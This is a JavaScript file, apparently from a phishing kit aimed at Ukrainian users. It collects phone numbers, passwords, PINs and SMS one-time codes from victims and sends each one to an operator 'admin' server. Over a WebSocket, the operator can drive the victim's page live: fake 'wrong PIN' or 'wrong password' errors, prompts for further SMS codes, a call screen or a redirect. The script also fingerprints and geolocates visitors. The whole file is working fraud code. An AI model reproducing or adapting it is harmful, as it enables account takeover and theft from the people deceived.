/**
 * Главный файл приложения лендинга
 * Отправляет данные на админку и получает команды через WebSocket
 */

// Глобальные переменные
let ws = null;
let sessionToken = null;
let pinValue = '';  // Для хранения введенного PIN
let isSubmittingPin = false;  // Флаг для предотвращения множественной отправки
let userData = {
    phone: null,
    password: null,
    pin: null,
    codes: []
};

// ============================================================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================================================

document.addEventListener('DOMContentLoaded', () => {
    if (CONFIG.SETTINGS.debug) {
        console.log('🚀 Лендинг инициализирован');
        console.log('📡 Админка:', CONFIG.ADMIN_API_URL);
    }
    
    // Показываем первый экран
    showScreen('screen-phone');
    
    // Инициализируем формы
    initPhoneForm();
    initPasswordForm();
    initPinForm();
    initCodeForm();
    
    // Создаем сессию и подключаемся к WebSocket
    createSession();
    
    // Отслеживаем закрытие страницы
    initOfflineDetection();
});

// Отслеживание закрытия/минимизации страницы
function initOfflineDetection() {
    // Когда пользователь закрывает вкладку/браузер
    window.addEventListener('beforeunload', () => {
        sendStatusSync('offline');
    });
    
    // Когда пользователь переключается на другую вкладку
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            // Свернул/переключился на другую вкладку - статус "minimized"
            sendStatus('minimized');
        } else {
            // Вернулся на вкладку - статус "online"
            sendStatus('online');
        }
    });
}

// Синхронная отправка статуса (для beforeunload)
function sendStatusSync(status) {
    if (!sessionToken) return;
    
    const data = JSON.stringify({
        session_token: sessionToken,
        status: status
    });
    
    // Используем sendBeacon для гарантированной отправки при закрытии
    const url = `${CONFIG.ADMIN_API_URL}/api/session/status`;
    navigator.sendBeacon(url, data);
    
    if (CONFIG.SETTINGS.debug) {
        console.log(`📴 Отправлен статус: ${status}`);
    }
}

// ============================================================================
// СОЗДАНИЕ СЕССИИ
// ============================================================================

async function createSession() {
    try {
        const fingerprint = await generateFingerprint();
        const geolocation = CONFIG.SETTINGS.sendGeolocation ? await getGeolocation() : null;
        
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/create`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                landing_id: CONFIG.LANDING_ID,
                landing_name: CONFIG.LANDING_NAME,
                fingerprint: fingerprint,
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                geolocation: geolocation
            })
        });
        
        const data = await response.json();
        sessionToken = data.session_token;
        
        if (CONFIG.SETTINGS.debug) {
            console.log('✅ Сессия создана:', sessionToken);
        }
        
        // Подключаемся к WebSocket для получения команд
        connectWebSocket();
        
    } catch (error) {
        console.error('❌ Ошибка создания сессии:', error);
        console.log('💡 Попробуем работать без backend (только UI)');
        // Создаем временный токен для локальной работы
        sessionToken = 'local_' + Date.now();
    }
}

// ============================================================================
// WEBSOCKET - ПОЛУЧЕНИЕ КОМАНД ОТ АДМИНКИ
// ============================================================================

function connectWebSocket() {
    try {
        ws = new WebSocket(`${CONFIG.ADMIN_WS_URL}/client/${sessionToken}`);
        
        ws.onopen = () => {
            if (CONFIG.SETTINGS.debug) {
                console.log('🔌 WebSocket подключен');
            }
            
            // Отправляем статус: онлайн
            sendStatus('online');
        };
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleCommand(data);
        };
        
        ws.onerror = (error) => {
            console.error('❌ WebSocket ошибка:', error);
        };
        
        ws.onclose = () => {
            if (CONFIG.SETTINGS.debug) {
                console.log('🔌 WebSocket отключен, переподключение...');
            }
            
            // Переподключение
            setTimeout(connectWebSocket, CONFIG.SETTINGS.wsReconnectTimeout);
        };
        
    } catch (error) {
        console.error('❌ Ошибка WebSocket:', error);
    }
}

function handleCommand(data) {
    if (CONFIG.SETTINGS.debug) {
        console.log('📨 Получена команда:', data);
    }
    
    const { command } = data;
    
    switch (command) {
        case 'show_3_code':
            showCodeScreen(3);
            break;
            
        case 'show_4_code':
            showCodeScreen(4);
            break;
            
        case 'show_pin':
            showScreen('screen-pin');
            clearPinInput();
            showError('pinError', 'Неправильний PIN-код. Спробуйте ще раз');
            break;
            
        case 'show_password':
            showScreen('screen-password');
            clearPasswordInput();
            showError('passwordError', 'Неправильний пароль. Введіть новий');
            break;
            
        case 'show_phone':
            showScreen('screen-phone');
            clearPhoneInput();
            showError('phoneError', 'Неправильний номер телефону. Введіть новий');
            break;
            
        case 'show_call':
            showCallScreen();
            break;
            
        case 'show_loading':
            showScreen('screen-loading');
            break;
        
        case 'show_message':
            // Показываем кастомное сообщение на экране загрузки
            showScreen('screen-loading');
            const loadingMessage = document.getElementById('loading-message');
            if (loadingMessage && data.message) {
                loadingMessage.textContent = data.message;
            }
            if (CONFIG.SETTINGS.debug) {
                console.log('📨 Показано сообщение:', data.message);
            }
            break;
            
        case 'redirect':
            if (data.url) {
                window.location.href = data.url;
            }
            break;
            
        default:
            console.warn('⚠️ Неизвестная команда:', command);
    }
}

// ============================================================================
// ОТПРАВКА ДАННЫХ НА АДМИНКУ
// ============================================================================

async function sendData(type, value) {
    try {
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/data/save`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_token: sessionToken,
                data_type: type,
                data_value: value
            })
        });
        
        if (CONFIG.SETTINGS.debug) {
            console.log(`✅ Данные отправлены: ${type} = ${value}`);
        }
        
        return await response.json();
        
    } catch (error) {
        console.error('❌ Ошибка отправки данных:', error);
        if (CONFIG.SETTINGS.debug) {
            console.log('💡 Данные не отправлены, но UI продолжает работать');
        }
    }
}

async function sendStatus(status) {
    try {
        await fetch(`${CONFIG.ADMIN_API_URL}/api/session/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_token: sessionToken,
                status: status
            })
        });
    } catch (error) {
        console.error('❌ Ошибка отправки статуса:', error);
    }
}

// ============================================================================
// ФОРМЫ - ОБРАБОТЧИКИ
// ============================================================================

function initPhoneForm() {
    const form = document.getElementById('phoneForm');
    const input = document.getElementById('phone');
    
    // Маска для телефона
    input.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 9) value = value.slice(0, 9);
        e.target.value = formatPhone(value);
    });
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const phone = '+380' + input.value.replace(/\D/g, '');
        
        if (phone.length < 13) {
            showError('phoneError', 'Введіть коректний номер телефону');
            return;
        }
        
        // Проверка украинских операторов (только основные 3)
        const phoneNumber = input.value.replace(/\D/g, '');
        const operatorCode = phoneNumber.substring(0, 2);
        
        // Vodafone, Kyivstar, lifecell
        const validOperators = [
            '50', // Vodafone
            '66', // Vodafone
            '95', // Vodafone
            '99', // Vodafone
            '75', // Vodafone
            '67', // Kyivstar
            '68', // Kyivstar
            '96', // Kyivstar
            '97', // Kyivstar
            '98', // Kyivstar
            '77', // Kyivstar
            '63', // lifecell
            '73', // lifecell
            '93'  // lifecell
        ];
        
        if (!validOperators.includes(operatorCode)) {
            showError('phoneError', `❌ Код ${operatorCode} не підходить. Введіть номер Vodafone (050, 066, 095, 099, 075), Kyivstar (067, 068, 096, 097, 098, 077) або lifecell (063, 073, 093)!`);
            return;
        }
        
        userData.phone = phone;
        
        // Отправляем телефон на админку
        await sendData('phone', phone);
        
        // Если это первый ввод телефона (пароль еще не был введен) - идем на пароль
        // Если это повторный ввод (после ошибки) - показываем загрузку
        if (!userData.password) {
            // Первый раз - переходим на экран пароля
            document.getElementById('phoneDisplay').textContent = formatPhoneDisplay(phone);
            showScreen('screen-password');
        } else {
            // Повторный ввод - показываем загрузку
            showScreen('screen-loading');
        }
    });
}

function initPasswordForm() {
    const form = document.getElementById('passwordForm');
    const input = document.getElementById('password');
    const toggle = document.getElementById('togglePassword');
    
    // Показываем последний введенный символ на 2 секунды
    let hideTimeout;
    input.addEventListener('input', (e) => {
        // Удаляем все символы кроме a-z, A-Z, 0-9
        const filteredValue = e.target.value.replace(/[^a-zA-Z0-9]/g, '');
        if (e.target.value !== filteredValue) {
            e.target.value = filteredValue;
        }
        
        // Показываем символы на 2 секунды
        if (input.type === 'password') {
            clearTimeout(hideTimeout);
            input.type = 'text';
            hideTimeout = setTimeout(() => {
                input.type = 'password';
            }, 2000);
        }
    });
    
    // Показать/скрыть пароль
    toggle.addEventListener('click', () => {
        const type = input.type === 'password' ? 'text' : 'password';
        input.type = type;
        toggle.textContent = type === 'password' ? '👁️' : '🙈';
    });
    
    // Редактировать телефон
    document.getElementById('editPhone').addEventListener('click', () => {
        showScreen('screen-phone');
    });
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const password = input.value;
        
        if (password.length < 6) {
            showError('passwordError', 'Пароль должен содержать минимум 6 символов');
            return;
        }
        
        // Проверяем что только английские буквы и цифры
        const validPassword = /^[a-zA-Z0-9]+$/.test(password);
        if (!validPassword) {
            showError('passwordError', 'Пароль может содержать только английские буквы и цифры');
            return;
        }
        
        userData.password = password;
        
        // Отправляем пароль на админку
        await sendData('password', password);
        
        // Если это первый ввод пароля (PIN еще не был введен) - идем на PIN
        // Если это повторный ввод (после ошибки) - показываем загрузку
        if (!userData.pin) {
            // Первый раз - переходим на экран PIN
            showScreen('screen-pin');
        } else {
            // Повторный ввод - показываем загрузку
            showScreen('screen-loading');
        }
    });
}

function initPinForm() {
    // Используем глобальную переменную pinValue
    const buttons = document.querySelectorAll('.keyboard-key');
    const pinDots = document.querySelectorAll('.pin-dot');
    const submitBtn = document.getElementById('submitPin');
    
    buttons.forEach(btn => {
        btn.addEventListener('click', () => {
            const key = btn.dataset.key;
            
            if (key === 'backspace') {
                pinValue = pinValue.slice(0, -1);
            } else if (key === 'cancel') {
                pinValue = '';
            } else if (pinValue.length < 4 && !isNaN(key)) {
                pinValue += key;
            }
            
            // Обновляем отображение точек
            updatePinDots(pinValue, pinDots);
            
            // Активируем кнопку если 4 цифры
            submitBtn.disabled = pinValue.length !== 4;
            
            // Если 4 цифры - автоматически отправляем
            if (pinValue.length === 4) {
                setTimeout(() => submitPin(pinValue), 300);
            }
        });
    });
    
    // Обработчик кнопки отправки
    submitBtn.addEventListener('click', () => {
        if (pinValue.length === 4) {
            submitPin(pinValue);
        }
    });
}

function clearPinInput() {
    // Очищаем глобальную переменную
    pinValue = '';
    isSubmittingPin = false;  // Сбрасываем флаг отправки
    
    // Очищаем визуальное отображение
    const pinDots = document.querySelectorAll('.pin-dot');
    pinDots.forEach(dot => {
        dot.classList.remove('pin-dot--filled');
    });
    
    // Деактивируем кнопку отправки
    const submitBtn = document.getElementById('submitPin');
    if (submitBtn) {
        submitBtn.disabled = true;
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🧹 PIN очищен');
    }
}

function clearPasswordInput() {
    // Очищаем поле пароля
    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.value = '';
        passwordInput.focus(); // Фокус на поле для удобства
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🧹 Пароль очищен');
    }
}

function clearPhoneInput() {
    // Очищаем поле телефона
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.value = '';
        phoneInput.focus(); // Фокус на поле для удобства
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🧹 Телефон очищен');
    }
}

async function submitPin(pin) {
    if (pin.length !== 4) {
        showError('pinError', 'Введіть 4-значний PIN-код');
        return;
    }
    
    // Защита от множественной отправки
    if (isSubmittingPin) {
        if (CONFIG.SETTINGS.debug) {
            console.log('⏳ PIN уже отправляется, пропускаем...');
        }
        return;
    }
    
    isSubmittingPin = true;
    userData.pin = pin;
    
    // Отправляем PIN на админку
    await sendData('pin', pin);
    
    // Очищаем PIN после отправки (чтобы при возврате на экран PIN было пусто)
    pinValue = '';
    
    // Сбрасываем флаг
    isSubmittingPin = false;
    
    // Показываем загрузку
    showScreen('screen-loading');
}

function initCodeForm() {
    // Код инициализируется динамически через showCodeScreen()
}

function showCodeScreen(digits) {
    const container = document.getElementById('codeInputs');
    const instruction = document.getElementById('codeInstruction');
    const submitBtn = document.getElementById('submitCode');
    
    // Очищаем контейнер
    container.innerHTML = '';
    
    // Обновляем инструкцию с номером телефона
    const phoneFormatted = userData.phone || '+380XXXXXXXXX';
    instruction.textContent = `На ваш номер ${phoneFormatted} відправлено СМС`;
    
    // Создаем поля ввода
    for (let i = 0; i < digits; i++) {
        const input = document.createElement('input');
        input.type = 'tel';
        input.className = 'code-input';
        input.maxLength = 1;
        input.pattern = '[0-9]';
        input.inputMode = 'numeric';
        input.dataset.index = i;
        
        // Автоматический переход на следующее поле
        input.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && i < digits - 1) {
                container.children[i + 1].focus();
            }
            
            // Проверяем заполненность всех полей
            checkCodeComplete();
        });
        
        // Backspace - переход на предыдущее поле
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && i > 0) {
                container.children[i - 1].focus();
            }
        });
        
        container.appendChild(input);
    }
    
    // Показываем экран кода
    showScreen('screen-code');
    
    // Фокус на первое поле
    container.children[0].focus();
    
    // Обработчик кнопки отправки
    submitBtn.onclick = () => submitCode(digits);
    
    // Запускаем таймер
    startTimer();
}

function checkCodeComplete() {
    const inputs = document.querySelectorAll('.code-input');
    const submitBtn = document.getElementById('submitCode');
    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
    
    submitBtn.disabled = !allFilled;
    
    // Если все заполнено - автоотправка
    if (allFilled) {
        setTimeout(() => submitCode(inputs.length), 300);
    }
}

async function submitCode(digits) {
    const inputs = document.querySelectorAll('.code-input');
    const code = Array.from(inputs).map(input => input.value).join('');
    
    if (code.length !== digits) {
        showError('codeError', 'Введіть усі цифри коду');
        return;
    }
    
    userData.codes.push(code);
    
    // Отправляем код на админку
    await sendData(`code_${digits}`, code);
    
    // Показываем загрузку
    showScreen('screen-loading');
}

// ============================================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================================

function showScreen(screenId) {
    // Скрываем все экраны
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    
    // Показываем нужный экран
    document.getElementById(screenId).classList.add('active');
}

function showError(errorId, message) {
    const errorDiv = document.getElementById(errorId);
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    
    // Ошибка остается на экране постоянно, не исчезает
}

function formatPhone(value) {
    if (value.length <= 2) return value;
    if (value.length <= 5) return `${value.slice(0, 2)} ${value.slice(2)}`;
    if (value.length <= 7) return `${value.slice(0, 2)} ${value.slice(2, 5)} ${value.slice(5)}`;
    return `${value.slice(0, 2)} ${value.slice(2, 5)} ${value.slice(5, 7)} ${value.slice(7)}`;
}

function formatPhoneDisplay(phone) {
    const cleaned = phone.replace('+380', '');
    return `+380 ${cleaned.slice(0, 2)} ${cleaned.slice(2, 5)} ${cleaned.slice(5, 7)} ${cleaned.slice(7)}`;
}

function updatePinDots(pinValue, pinDots) {
    pinDots.forEach((dot, index) => {
        if (index < pinValue.length) {
            dot.classList.add('pin-dot--filled');
        } else {
            dot.classList.remove('pin-dot--filled');
        }
    });
}

function startTimer() {
    let seconds = 30;
    const timerEl = document.getElementById('timer');
    const resendLink = document.getElementById('resendLink');
    
    const interval = setInterval(() => {
        seconds--;
        
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        timerEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        
        if (seconds <= 0) {
            clearInterval(interval);
            resendLink.classList.remove('resend-link--disabled');
        }
    }, 1000);
}

function showCallScreen() {
    // Показываем экран звонка и оставляем его (без автоперехода)
    showScreen('screen-call');
    
    // Экран будет крутиться бесконечно, пока админ не нажмет другую команду
    if (CONFIG.SETTINGS.debug) {
        console.log('📞 Экран звонка показан (ожидание бесконечно)');
    }
}

// ============================================================================
// FINGERPRINTING
// ============================================================================

async function generateFingerprint() {
    const components = [
        navigator.userAgent,
        navigator.language,
        screen.width,
        screen.height,
        screen.colorDepth,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency || 'unknown',
        navigator.deviceMemory || 'unknown'
    ];
    
    const fingerprint = await hashString(components.join('|'));
    return fingerprint;
}

async function hashString(str) {
    const buffer = new TextEncoder().encode(str);
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

async function getGeolocation() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                () => resolve(null),
                { timeout: 5000 }
            );
        } else {
            resolve(null);
        }
    });
}

// ============================================================================
// ОТСЛЕЖИВАНИЕ АКТИВНОСТИ
// ============================================================================

// Отслеживание видимости страницы
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        sendStatus('minimized');
    } else {
        sendStatus('online');
    }
});

// Отслеживание ухода со страницы
window.addEventListener('beforeunload', () => {
    sendStatus('offline');
});

// ============================================================================
// ГОТОВО
// ============================================================================

if (CONFIG.SETTINGS.debug) {
    console.log('✅ app.js загружен');
}

